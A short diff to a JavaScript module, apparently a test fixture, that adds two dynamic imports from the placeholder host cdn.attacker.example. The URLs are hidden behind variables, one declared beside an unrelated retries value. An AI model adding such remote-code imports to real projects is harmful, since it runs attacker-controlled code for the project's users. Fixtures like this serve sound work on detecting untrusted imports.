@@ -7,5 +7,10 @@ const stageModule = await import(STAGE_URL);
 const theme = await import(`${CDN_BASE}/theme.js`);
 const icons = await import(CDN_BASE + '/icons.js');
 const plugin = await import(/* @vite-ignore */ PLUGIN_URL);
+let retries = 3, LEGACY_URL = 'https://cdn.attacker.example/legacy.js';
+const legacy = await import(LEGACY_URL);
+let fallbackUrl;
+fallbackUrl = 'https://cdn.attacker.example/fallback.js';
+const fallback = await import(fallbackUrl);
 
-export { stageModule, theme, icons, plugin };
+export { stageModule, theme, icons, plugin, retries, legacy, fallback };
